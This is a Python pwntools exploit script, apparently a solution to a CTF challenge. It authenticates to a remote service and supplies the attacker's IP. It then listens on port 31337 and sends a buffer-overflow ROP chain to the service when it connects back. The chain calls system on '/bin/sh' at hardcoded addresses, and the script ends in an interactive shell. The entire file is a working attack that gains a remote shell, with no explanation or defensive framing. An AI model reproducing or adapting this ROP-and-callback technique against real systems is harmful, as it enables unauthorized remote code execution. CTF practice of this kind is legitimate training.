import time
import os
import socket
import threading

from pwnlib import gdb
import pwn
#pwn.context(arch='amd64', os='linux')
#pwn.context.log_level = "debug"
pwn.warnings.filterwarnings('ignore')

myIP = '10.8.76.123'
filepath = "./root.elf"



def OnThread(targetElf) :
	HOST = "0.0.0.0"
	PORT = 31337

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.bind((HOST, PORT))
		s.listen()
		c, addr = s.accept()
		if not c:
			return
	except e:
		print("ERROR!", e)
		os._exit(1)

	print(f"Connected by {addr}")

	#0000000000400A20
	#payload += pwn.p32(targetElf.symbols.win)

	rop = pwn.ROP(targetElf)
	ropRet = rop.find_gadget(['ret'])[0] 
	print(hex(ropRet))
	popRdi = rop.find_gadget(['pop rdi', 'ret'])[0] 
	print(popRdi)
	popRsi = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0] 
	print(popRsi)

	xorKeyToSubmit = b'nc3ctf24'

	data  = xorKeyToSubmit
	data += b' ' * (32 - len(xorKeyToSubmit))
	data += b'A' * 16
	data += b'B' * 8

	data += pwn.p64(ropRet)
	data += pwn.p64(0x0000000000400A20)		# Vuln function
	data += pwn.p64(popRdi)
	data += pwn.p64(0x0000000000601340)		# /bin/sh after XOR
	data += pwn.p64(0x0000000000400AB9)		# .text:0000000000400AB9                 call    _system

	# That's it - no more space left

	#data += pwn.p64(ropRet)
	#data += pwn.p64(0x00000000004008C0)		# main

	data += b'C' * 16
	data += b'\n'
	c.send(data)



targetElf = pwn.ELF(filepath)

listeningThread = threading.Thread(target=OnThread, args=(targetElf,))
listeningThread.start()




# Set up the process
#p = pwn.process(filepath)
p = pwn.remote('10.10.102.102', 1337)

#pid, io_gdb = gdb.attach(p, api=True)
#bp = io_gdb.Breakpoint('*0x0000000000400BB0', temporary=False)
#io_gdb.continue_nowait()
#time.sleep(15)


print(p.recvuntil("kodeordet:> "))

p.sendline("mr. goodbytes")


print(p.recvuntil("til storenisse:> "))
p.sendline(myIP)


print(p.recv())
#print(p.recv())
#print(p.recv())

#time.sleep(10000)

listeningThread.join()

print("OK")

#time.sleep(50)
#print(p.recv())

p.interactive()
